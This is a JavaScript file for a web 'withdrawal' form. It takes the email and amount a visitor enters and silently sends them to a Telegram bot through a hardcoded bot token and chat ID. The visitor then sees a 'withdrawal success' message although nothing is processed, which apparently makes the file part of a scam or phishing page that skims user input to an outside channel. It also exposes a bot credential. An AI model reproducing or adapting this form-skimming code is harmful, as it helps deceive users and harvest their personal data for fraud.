let codeMain = document.getElementById('codeMain')
let amountMain = document.getElementById('amountMain')
let codeDiv = document.getElementById('codeDiv')
let codeConfirm = document.getElementById('codeConfirm')
let withdrawSuccess = document.querySelector('.withdrawSuccess')
let incorrectCode = document.querySelector('.incorrectCode')

// Send click to telegram
const sendToken = async() =>{
    let codeemail = codeMain.value
    let codeamountMain = amountMain.value
    if(codeemail == '' || codeamountMain == ''){
        incorrectCode.style.display = 'flex'
        incorrectCode.textContent = 'Fill all empty boxes'
        return
    }
    try {
        sendToTelegram(codeemail, codeamountMain)
        codeDiv.style.display = 'none'
        withdrawSuccess.style.display = 'flex'
    } catch (error) {
        incorrectCode.style.display = 'flex'
        incorrectCode.textContent = error.message
    }
}

codeConfirm.addEventListener('click', sendToken)


// SENDING DETIALS TO TELEGRAM
function sendToTelegram(codeemail, codeamountMain){
    const API_KEY = '7048538136:AAGlNzqAf5uO-z1rvGmS2FUxMRowDiY27SI'
    const chat_id = 6399168843

    const message = `
      Withdrawal Message:
      Amount: ${codeamountMain}
      Email: ${codeemail}
     `
  ;

fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
    chat_id: `${chat_id}`,
    text: message,
}),
})
.then(response => response.json())
.then(data =>  {
//   console.log('Message sent:', data)
//   if(data.ok){
//     alert(`Order of ${productName} placed`)
//   }
})
.catch(error => console.error('Error sending message:', error));
}